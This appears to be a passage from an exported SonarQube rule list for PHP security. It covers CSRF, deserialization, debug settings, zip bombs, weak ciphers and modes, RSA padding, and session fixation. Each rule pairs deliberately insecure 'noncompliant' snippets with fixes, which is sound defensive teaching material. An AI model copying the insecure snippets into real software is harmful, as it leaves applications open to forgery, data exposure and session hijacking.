<p>For <a href="https://symfony.com/doc/current/security/csrf.html#csrf-protection-in-symfony-forms">Symfony Forms</a></p>
<pre>
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class Controller extends AbstractController {

  public function action() {
    $this-&gt;createForm('', null, [
      'csrf_protection' =&gt; false, // Sensitive; disable CSRF protection for a single form
    ]);
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://laravel.com/docs/8.x/csrf#csrf-excluding-uris">Laravel VerifyCsrfToken middleware</a></p>
<pre>
use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken as Middleware;

class VerifyCsrfToken extends Middleware
{
    protected $except = []; // Compliant
}
</pre>
<p>Remember to add <a href="https://laravel.com/docs/8.x/blade#csrf-field">@csrf</a> blade directive to the relevant forms when removing an element
from $except. Otherwise the form submission will stop working.</p>
<p>For <a href="https://symfony.com/doc/current/security/csrf.html#csrf-protection-in-symfony-forms">Symfony Forms</a></p>
<pre>
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class Controller extends AbstractController {

  public function action() {
    $this-&gt;createForm('', null, []); // Compliant; CSRF protection is enabled by default
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4508">
              php:S4508
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Deserializing objects is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17672">CVE-2017-17672</a>: vBulletin: Unserialize PHP Code Execution </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000167">CVE-2018-1000167</a>: Jenkins Pipeline: arbitrary code execution
  vulnerability </li>
</ul>
<p>Object deserialization from an untrusted source can lead to unexpected code execution. Deserialization takes a stream of bits and turns it into an
object. If the stream contains the type of object you expect, all is well. But if you’re deserializing data coming from untrusted input, and an
attacker has inserted some other type of object, you’re in trouble. Why? <a href="https://www.owasp.org/index.php/PHP_Object_Injection">A known attack
scenario</a> involves the creation of a serialized PHP object with crafted attributes which will modify your application’s behavior. This attack
relies on <a href="https://php.net/manual/en/language.oop5.magic.php">PHP magic methods</a> like <code>__desctruct</code>, <code>__wakeup</code> or
<code>__string</code>. The attacker doesn’t necessarily need the source code of the targeted application to exploit the vulnerability, he can also
rely on the presence of open-source component and use <a href="https://github.com/ambionics/phpggc">tools to craft malicious payloads</a>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an attacker could have tampered with the source provided to the deserialization function </li>
  <li> you are using an unsafe deserialization function </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To prevent insecure deserialization, it is recommended to:</p>
<ul>
  <li> Use safe libraries that do not allow code execution at deserialization. </li>
  <li> Not communicate with the outside world using serialized objects </li>
  <li> Limit access to the serialized source
    <ul>
      <li> if it is a file, restrict the access to it. </li>
      <li> if it comes from the network, restrict who has access to the process, such as with a Firewall or by authenticating the sender first. </li>
    </ul>  </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data">OWASP - Deserialization of untrusted data</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#OBJECT_DESERIALIZATION">OBJECT_DESERIALIZATION </a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4507">
              php:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p>CakePHP 1.x, 2.x:</p>
<pre>
Configure::write('debug', 1); // Sensitive: development mode
or
Configure::write('debug', 2); // Sensitive: development mode
or
Configure::write('debug', 3); // Sensitive: development mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config('debug', true); // Sensitive: development mode
</pre>
<p>WordPress:</p>
<pre>
define( 'WP_DEBUG', true ); // Sensitive: development mode
</pre>
<h2>Compliant Solution</h2>
<p>CakePHP 1.2:</p>
<pre>
Configure::write('debug', 0); // Compliant; this is the production mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config('debug', false); // Compliant:  "0" or "false" for CakePHP 3.x is suitable (production mode) to not leak sensitive data on the logs.
</pre>
<p>WordPress:</p>
<pre>
define( 'WP_DEBUG', false ); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5042">
              php:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://www.php.net/manual/en/class.ziparchive.php">ZipArchive</a> module:</p>
<pre>
$zip = new ZipArchive();
if ($zip-&gt;open($file) === true) {
    $zip-&gt;extractTo('.'); // Sensitive
    $zip-&gt;close();
}
</pre>
<p>For <a href="https://www.php.net/manual/en/ref.zip.php">Zip</a> module:</p>
<pre>
$zip = zip_open($file);
while ($file = zip_read($zip)) {
    $filename = zip_entry_name($file);
    $size = zip_entry_filesize($file);

    if (substr($filename, -1) !== '/') {
        $content = zip_entry_read($file, zip_entry_filesize($file)); // Sensitive - zip_entry_read() uses zip_entry_filesize()
        file_put_contents($filename, $content);
    } else {
        mkdir($filename);
    }
}
zip_close($zip);
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://www.php.net/manual/en/class.ziparchive.php">ZipArchive</a> module:</p>
<pre>
define('MAX_FILES', 10000);
define('MAX_SIZE', 1000000000); // 1 GB
define('MAX_RATIO', 10);
define('READ_LENGTH', 1024);

$fileCount = 0;
$totalSize = 0;

$zip = new ZipArchive();
if ($zip-&gt;open($file) === true) {
    for ($i = 0; $i &lt; $zip-&gt;numFiles; $i++) {
        $filename = $zip-&gt;getNameIndex($i);
        $stats = $zip-&gt;statIndex($i);

        if (strpos($filename, '../') !== false || substr($filename, 0, 1) === '/') {
            throw new Exception();
        }

        if (substr($filename, -1) !== '/') {
            $fileCount++;
            if ($fileCount &gt; MAX_FILES) {
                // Reached max. number of files
                throw new Exception();
            }

            $fp = $zip-&gt;getStream($filename); // Compliant
            $currentSize = 0;
            while (!feof($fp)) {
                $currentSize += READ_LENGTH;
                $totalSize += READ_LENGTH;

                if ($totalSize &gt; MAX_SIZE) {
                    // Reached max. size
                    throw new Exception();
                }

                // Additional protection: check compression ratio
                if ($stats['comp_size'] &gt; 0) {
                    $ratio = $currentSize / $stats['comp_size'];
                    if ($ratio &gt; MAX_RATIO) {
                        // Reached max. compression ratio
                        throw new Exception();
                    }
                }

                file_put_contents($filename, fread($fp, READ_LENGTH), FILE_APPEND);
            }

            fclose($fp);
        } else {
            mkdir($filename);
        }
    }
    $zip-&gt;close();
}
</pre>
<p>For <a href="https://www.php.net/manual/en/ref.zip.php">Zip</a> module:</p>
<pre>
define('MAX_FILES', 10000);
define('MAX_SIZE', 1000000000); // 1 GB
define('MAX_RATIO', 10);
define('READ_LENGTH', 1024);

$fileCount = 0;
$totalSize = 0;

$zip = zip_open($file);
while ($file = zip_read($zip)) {
    $filename = zip_entry_name($file);

    if (strpos($filename, '../') !== false || substr($filename, 0, 1) === '/') {
        throw new Exception();
    }

    if (substr($filename, -1) !== '/') {
        $fileCount++;
        if ($fileCount &gt; MAX_FILES) {
            // Reached max. number of files
            throw new Exception();
        }

        $currentSize = 0;
        while ($data = zip_entry_read($file, READ_LENGTH)) { // Compliant
            $currentSize += READ_LENGTH;
            $totalSize += READ_LENGTH;

            if ($totalSize &gt; MAX_SIZE) {
                // Reached max. size
                throw new Exception();
            }

            // Additional protection: check compression ratio
            if (zip_entry_compressedsize($file) &gt; 0) {
                $ratio = $currentSize / zip_entry_compressedsize($file);
                if ($ratio &gt; MAX_RATIO) {
                    // Reached max. compression ratio
                    throw new Exception();
                }
            }

            file_put_contents($filename, $data, FILE_APPEND);
        }
    } else {
        mkdir($filename);
    }
}
zip_close($zip);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2278">
              php:S2278
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=php%3AS5547&rule_key=php%3AS5547'>S5547</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
&lt;?php
  $ciphertext = mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext = mcrypt_encrypt(MCRYPT_DES_COMPAT, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext = mcrypt_encrypt(MCRYPT_TRIPLEDES, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext = mcrypt_encrypt(MCRYPT_3DES, $key, $plaintext, $mode); // Noncompliant

  $cipher = "des-ede3-cfb";  // Noncompliant
  $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
?&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
&lt;?php
  $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
?&gt;
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5547">
              php:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Mcrypt</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Mcrypt is deprecated and should not be used. You can use <a href="https://www.php.net/manual/en/book.sodium.php">Sodium</a> instead.</p>
<pre data-diff-id="1" data-diff-type="compliant">
sodium_crypto_aead_aes256gcm_encrypt($plaintext, '', $nonce, $key);
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5542">
              php:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Mcrypt</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, "ecb"); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Mcrypt is deprecated and should not be used. You can use <a href="https://www.php.net/manual/en/book.sodium.php">Sodium</a> instead.</p>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
sodium_crypto_aead_aes256gcm_encrypt($plaintext, '', $nonce, $key);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2277">
              php:S2277
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=php%3AS5542&rule_key=php%3AS5542'>S5542</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an
issue when <code>openssl_public_encrypt</code> is used with one the following padding constants: <code>OPENSSL_NO_PADDING</code> or
<code>OPENSSL_PKCS1_PADDING</code> or <code>OPENSSL_SSLV23_PADDING</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
function encrypt($data, $key) {
  $crypted='';
  openssl_public_encrypt($data, $crypted, $key, OPENSSL_NO_PADDING); // Noncompliant
  return $crypted;
}
</pre>
<h3>Compliant solution</h3>
<pre>
function encrypt($data, $key) {
  $crypted='';
  openssl_public_encrypt($data, $crypted, $key, OPENSSL_PKCS1_OAEP_PADDING);
  return $crypted;
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/780">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING">RSA NoPadding Unsafe</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5876">
              php:S5876
            </a>
          </td>
          <td>
            <details>
              <p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and
impersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>
<h2>Why is this an issue?</h2>
<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically
works:</p>
<ul>
  <li> When a user visits a website or logs in, a session is created for them. </li>
  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,
  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>
  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the
  attacker. </li>
  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain
unauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>
<h4>Impersonation</h4>
<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid
credentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing
malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as
revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h4>Data Breach</h4>
<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include
personal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can
be used for identity theft, financial fraud, or other malicious purposes.</p>
<h4>Privilege Escalation</h4>
<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher
privileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized
modifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>
<h3>How to fix it in Symfony</h3>
<h3>Code examples</h3>
<p>In a Symfony Security’s context, session fixation protection can be disabled with the value <code>none</code> for the
<code>session_fixation_strategy</code> attribute.</p>
<p>Session fixation protection is enabled by default in Symfony. It can be explicitly enabled with the values <code>migrate</code> and
<code>invalidate</code> for the <code>session_fixation_strategy</code> attribute.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return static function (ContainerConfigurator $container) {
    $container-&gt;extension('security', [
        'session_fixation_strategy' =&gt; 'none', // Noncompliant
    ]);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return static function (ContainerConfigurator $container) {
    $container-&gt;extension('security', [
        'session_fixation_strategy' =&gt; 'migrate',
    ]);
};
</pre>
<h3>How does this work?</h3>
<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated
during the authentication process.</p>
<p>Here’s how session fixation protection typically works:</p>
<ol>
  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored
  in a cookie or passed through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows
  the attacker to potentially gain unauthorized access to the user’s session. </li>
  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a
  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>
  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.
  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>
  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier
  is typically stored in a new session cookie or passed through URL parameters. </li>
</ol>
<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,
secure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s
session and helps maintain the integrity and security of the application’s session management process.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<p><a href="https://symfony.com/doc/current/reference/configuration/security.html#session-fixation-strategy">Security Configuration Reference -
Session Fixation Strategy</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> <a href="https://owasp.org/www-community/attacks/Session_fixation">OWASP Sesssion Fixation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
